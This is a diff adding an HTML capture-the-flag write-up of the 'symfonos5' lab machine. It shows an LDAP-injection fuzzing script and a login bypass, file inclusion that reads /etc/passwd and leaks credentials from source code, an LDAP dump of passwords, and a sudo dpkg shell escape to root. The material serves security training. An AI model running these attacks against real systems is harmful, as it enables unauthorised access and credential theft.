@@ -1,0 +1,212 @@
+I">C<p>This is a beginner real life based machine created by <strong>zayotic</strong>, designed to teach people the importance of understanding from the interior.</p>
+
+<h2 id="information-gathering">Information Gathering</h2>
+<h3 id="host-discovery">Host Discovery</h3>
+<p>We start by discovering the target host, as shown below:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/symfonos5<span class="nv">$ </span>netdiscover <span class="nt">-i</span> vmnet1 <span class="nt">-r</span> 192.168.179.1/24
+ Currently scanning: Finished!   |   Screen View: Unique Hosts 
+                                                                
+ 4 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 222  
+ _________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname 
+ <span class="nt">-------------------------------------------------------------------------</span>
+ 192.168.179.140 00:0c:29:55:30:bb      3     180  VMware, Inc. 
+ 192.168.179.254 00:50:56:fe:ba:48      1      42  VMware, Inc.
+</code></pre></div></div>
+
+<h3 id="port-scanning">Port Scanning</h3>
+<p>Located the objective host, I perform a full TCP port scan with nmap.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/symfonos5<span class="nv">$ </span>nmap <span class="nt">-T5</span> <span class="nt">-p-</span> <span class="nt">-n</span> <span class="nt">-vv</span> 192.168.179.140 <span class="nt">-oG</span> nmap-tcp-all-ports.txt
+...
+PORT    STATE SERVICE REASON
+22/tcp  open  ssh     syn-ack ttl 64
+80/tcp  open  http    syn-ack ttl 63
+389/tcp open  ldap    syn-ack ttl 63
+636/tcp open  ldapssl syn-ack ttl 63
+MAC Address: 00:0C:29:55:30:BB <span class="o">(</span>VMware<span class="o">)</span>
+....
+</code></pre></div></div>
+
+<h3 id="service-enumeration">Service Enumeration</h3>
+<p>Then I focus on detecting the version of the services for open TCP ports.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/symfonos5<span class="nv">$ </span>nmap <span class="nt">-A</span> <span class="nt">-p22</span>,80,389,636 <span class="nt">-n</span> <span class="nt">-vv</span> 192.168.179.140 <span class="nt">-oN</span> tcp-service-enum.txt
+...
+PORT    STATE SERVICE  REASON         VERSION                                                                                                                      
+22/tcp  open  ssh      syn-ack ttl 64 OpenSSH 7.9p1 Debian 10+deb10u1 <span class="o">(</span>protocol 2.0<span class="o">)</span>                                                                               
+| ssh-hostkey:                                                                                                                                                     
+|   2048 16:70:13:77:22:f9:68:78:40:0d:21:76:c1:50:54:23 <span class="o">(</span>RSA<span class="o">)</span>                                                                                                     
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDfhCNEk87fJIphggJ/K7+9vu2pm9OmRmuYZ4tIPDCr42LgzGp6EIWpz5FXo98F1iq1pNASEjcMqqpCxuhhOFSlf3pPA00Rka4/0pmlmtIl5jSE6cpexIXzINzLC
+6YXDt59JFuOi0PgsbBYbIWsRdNxPboBDELeilgNairkx3wakNr39Di1SmrpQyQ54EbpusuNZPZL9eBjgEScXrx+MCnA4gyQ+VwEbMXDBfC6q5zO+poZQ1wkAqg9+LFvd2RuwGB+06yFfVn84UpBh4Fxf+cpnKG0zJal
+RfI8ZhUgnvEnU7cIp8Yb94pUzXf1+m1Vsau8+0myI0aaljHt4RfSfI3T                                                                                                           
+|   256 a8:06:23:d0:93:18:7d:7a:6b:05:77:8d:8b:c9:ec:02 <span class="o">(</span>ECDSA<span class="o">)</span>                                                                                                    
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHUvkrh2jAIVELCTy59BYzC3B0S4/jKkYOmS6N7anjrxvHW59thSrs7+3pvVhM5X0Og+FV4zkrMMfvw5jwTygeA<span class="o">=</span> 
+|   256 52:c0:83:18:f4:c7:38:65:5a:ce:97:66:f3:75:68:4c <span class="o">(</span>ED25519<span class="o">)</span>                                                                                                  
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKxA6/wOoEAbxcDJX8zdCYFQzulYfpxK4n4e7bUSUeeC                                                                                 
+80/tcp  open  http     syn-ack ttl 63 Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>                                                                                               
+| http-methods:                                                                                                                                                    
+|_  Supported Methods: POST OPTIONS HEAD GET                                                                                                                       
+|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>                                                                                                                       
+|_http-title: Site doesn<span class="s1">'t have a title (text/html).                                                                            
+389/tcp open  ldap     syn-ack ttl 63 OpenLDAP 2.2.X - 2.3.X                                                                                                       
+636/tcp open  ldapssl? syn-ack ttl 63
+...
+</span></code></pre></div></div>
+
+<h3 id="web-enumeration">Web Enumeration</h3>
+
+<p>I then proceed to browse the web page on port 80 and found nothing interesting.</p>
+
+<p><img src="/assets/images/symfonos5/screenshot-1.png" alt="" /></p>
+
+<p>Then I fire dirsearch to perform brute force and find hidden files and directories.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/symfonos5<span class="nv">$ </span>dirsearch <span class="nt">-u</span> http://192.168.179.140 <span class="nt">-w</span> /usr/share/dirb/wordlists/common.txt <span class="nt">-f</span> <span class="nt">-e</span> php,html,txt
+...
+<span class="o">[</span>23:43:06] 200 -    2KB - /admin.php/
+<span class="o">[</span>23:43:06] 200 -    2KB - /admin.php
+<span class="o">[</span>23:44:14] 302 -    0B  - /home.php  -&gt;  admin.php
+<span class="o">[</span>23:44:16] 403 -  280B  - /icons/
+<span class="o">[</span>23:44:18] 200 -  207B  - /index.html
+<span class="o">[</span>23:44:33] 302 -    0B  - /logout.php  -&gt;  admin.php
+<span class="o">[</span>23:45:26] 403 -  280B  - /server-status/
+<span class="o">[</span>23:45:26] 403 -  280B  - /server-status
+<span class="o">[</span>23:45:36] 200 -    2KB - /static/
+<span class="o">[</span>23:45:37] 301 -  319B  - /static  -&gt;  http://192.168.179.140/static/
+</code></pre></div></div>
+
+<p>The <strong>admin.php</strong> file looks interesting, so I request with the browser and I find a login page.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://192.168.179.140/admin.php
+</code></pre></div></div>
+<p><img src="/assets/images/symfonos5/screenshot-2.png" alt="" /></p>
+
+<p><strong>LDAP Injection</strong></p>
+
+<p>Analyzing what the system could be using to authenticate users, possibly via LDAP, since this service is open, so I download a dictionary and develop a python script to test for LDAP Injection.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/symfonos5<span class="nv">$ </span>wget https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/LDAP%20Injection/Intruder/LDAP_FUZZ.txt
+</code></pre></div></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="n">target</span><span class="o">=</span><span class="s">"http://192.168.179.140"</span>
+
+<span class="k">def</span> <span class="nf">login_ldap</span><span class="p">(</span><span class="n">target</span><span class="p">,</span><span class="n">u</span><span class="p">):</span>
+    <span class="n">r</span><span class="o">=</span><span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">f"</span><span class="si">{</span><span class="n">target</span><span class="si">}</span><span class="s">/admin.php?username=</span><span class="si">{</span><span class="n">u</span><span class="si">}</span><span class="s">&amp;password=123"</span><span class="p">)</span>
+    <span class="k">return</span> <span class="nb">len</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
+
+<span class="n">wordlist</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="s">"LDAP_FUZZ.txt"</span><span class="p">).</span><span class="n">read</span><span class="p">().</span><span class="n">splitlines</span><span class="p">()</span>
+
+<span class="k">if</span> <span class="n">__name__</span><span class="o">==</span><span class="s">"__main__"</span><span class="p">:</span>
+    <span class="k">for</span> <span class="n">w</span> <span class="ow">in</span> <span class="n">wordlist</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">f"</span><span class="si">{</span><span class="n">login_ldap</span><span class="p">(</span><span class="n">target</span><span class="p">,</span><span class="n">w</span><span class="p">):</span><span class="mi">5</span><span class="si">}</span><span class="s"> =&gt; </span><span class="si">{</span><span class="n">w</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Then I run the script and we see a different value in the length of the request.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/symfonos5<span class="nv">$ </span>python3 ldap_fuzz.py
+... 
+1663 <span class="o">=&gt;</span> <span class="k">*</span><span class="o">)(</span>&amp;           
+ 962 <span class="o">=&gt;</span> <span class="k">*</span><span class="o">))</span>%00  
+1663 <span class="o">=&gt;</span> <span class="k">*</span><span class="o">()</span>|%26<span class="s1">'
+...
+</span></code></pre></div></div>
+
+<p>We check this, and managed to bypass this login page.</p>
+
+<p><img src="/assets/images/symfonos5/screenshot-3.png" alt="" /></p>
+
+<p><img src="/assets/images/symfonos5/screenshot-4.png" alt="" /></p>
+
+<p>Poked around the web application, in the home resource we see that it is calling the <strong>url</strong> parameter and including a url.</p>
+
+<p><img src="/assets/images/symfonos5/screenshot-5.png" alt="" /></p>
+
+<p>So I tried to test for Remote File Inclusion but this doesn’t work, then I include the <strong>/etc/passwd</strong> file and works. 
+<img src="/assets/images/symfonos5/screenshot-6.png" alt="" /></p>
+
+<p>Subsequently I decided use wrappers to see de source code of the <strong>home.php</strong> file, and the function that it’s using to include files is <strong>file_get_contents</strong>, for this reason it was not possible to exploit the File Inclusion vulnerability, since with this function it is not possible to execute php code.</p>
+
+<p>Then I tried to see the content of the <strong>admin.php</strong> file, for this we need the session cookie, we intercept the request with burpsuite and copy the cookie for then include it in our curl request, as shown below:</p>
+
+<p><img src="/assets/images/symfonos5/screenshot-7.png" alt="" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/symfonos5<span class="nv">$ </span>curl <span class="nt">-s</span> <span class="nt">--cookie</span> <span class="s2">"PHPSESSID=l858dt8bk4coinqvjcskmutsg9"</span> <span class="s2">"http://192.168.179.140/home.php?url=php://filter/convert.base64-encode/resource=admin.php"</span> | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'^\w[^&lt;]*'</span> | <span class="nb">base64</span> <span class="nt">-d</span> | <span class="nb">tee </span>admin.php
+...
+<span class="nv">$bind</span> <span class="o">=</span> ldap_bind<span class="o">(</span><span class="nv">$ldap_ch</span>, <span class="s2">"cn=admin,dc=symfonos,dc=local"</span>, <span class="s2">"qMDdyZh3cT6eeAWD"</span><span class="o">)</span><span class="p">;</span>
+...
+</code></pre></div></div>
+<p>In the output we can see the connection credentials for LDAP, With this We’ll try to enumerate the LDAP service on port 389.</p>
+
+<h3 id="ldap-enumeration">LDAP Enumeration</h3>
+<p>With the <strong>ldapsearch</strong> utility we can try to enumerate for user credentials.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/symfonos5<span class="nv">$ </span>ldapsearch <span class="nt">-h</span> 192.168.179.140 <span class="nt">-x</span> <span class="nt">-D</span> <span class="s2">"cn=admin,dc=symfonos,dc=local"</span> <span class="nt">-b</span> <span class="s2">"dc=symfonos,dc=local"</span> <span class="nt">-W</span>
+Enter LDAP Password: 
+...
+<span class="c"># admin, symfonos.local</span>
+dn: <span class="nv">cn</span><span class="o">=</span>admin,dc<span class="o">=</span>symfonos,dc<span class="o">=</span><span class="nb">local
+</span>objectClass: simpleSecurityObject
+objectClass: organizationalRole
+cn: admin
+description: LDAP administrator
+userPassword:: <span class="nv">e1NTSEF9VVdZeHZ1aEEwYldzamZyMmJodHhRYmFwcjllU2dLVm0</span><span class="o">=</span>
+
+<span class="c"># zeus, symfonos.local</span>
+dn: <span class="nv">uid</span><span class="o">=</span>zeus,dc<span class="o">=</span>symfonos,dc<span class="o">=</span><span class="nb">local
+</span>uid: zeus
+cn: zeus
+sn: 3
+objectClass: top
+objectClass: posixAccount
+objectClass: inetOrgPerson
+loginShell: /bin/bash
+homeDirectory: /home/zeus
+uidNumber: 14583102
+gidNumber: 14564100
+userPassword:: <span class="nv">Y2V0a0tmNHdDdUhDOUZFVA</span><span class="o">==</span>
+mail: zeus@symfonos.local
+gecos: Zeus User
+...
+</code></pre></div></div>
+<p>As we see in the above results the, <strong>zeus</strong> username and password was revelated, the password is base64 encoded, so let’s decode it.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/symfonos5<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"Y2V0a0tmNHdDdUhDOUZFVA=="</span> | <span class="nb">base64</span> <span class="nt">-d</span><span class="p">;</span> <span class="nb">echo
+</span>cetkKf4wCuHC9FET
+</code></pre></div></div>
+
+<h2 id="exploitation">Exploitation</h2>
+<h3 id="access-via-ssh">Access via SSH</h3>
+<p>With the <strong>zeus</strong> user and the decoded password we log in to the SSH service, then we enumerate for the sudo permissions and we see that the <strong>dpkg</strong> command can be executed as root without password.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/symfonos5<span class="nv">$ </span>ssh zeus@192.168.179.140
+zeus@192.168.179.140<span class="s1">'s password:
+zeus@symfonos5:~$ sudo -l
+Matching Defaults entries for zeus on symfonos5:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User zeus may run the following commands on symfonos5:
+    (root) NOPASSWD: /usr/bin/dpkg
+</span></code></pre></div></div>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="dpkg-sudo-permissions">dpkg Sudo Permissions</h3>
+<p>dpkg is a tool to install, build, remove and manage, packages. With this utility an attacker can install malicious software or elevate privileges to root.</p>
+
+<p>With the following instruction we list packages in a less format, then we invoke a bash shell and finally we get root.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>zeus@symfonos5:~<span class="nv">$ </span><span class="nb">sudo </span>dpkg <span class="nt">-l</span>
+<span class="nv">Desired</span><span class="o">=</span>Unknown/Install/Remove/Purge/Hold  
+| <span class="nv">Status</span><span class="o">=</span>Not/Inst/Conf-files/Unpacked/halF-conf/Half-inst/trig-aWait/Trig-pend
+|/ Err?<span class="o">=(</span>none<span class="o">)</span>/Reinst-required <span class="o">(</span>Status,Err: <span class="nv">uppercase</span><span class="o">=</span>bad<span class="o">)</span>
+...
+<span class="o">!</span>/bin/bash
+root@symfonos5:/home/zeus# <span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</code></pre></div></div>
+:ET
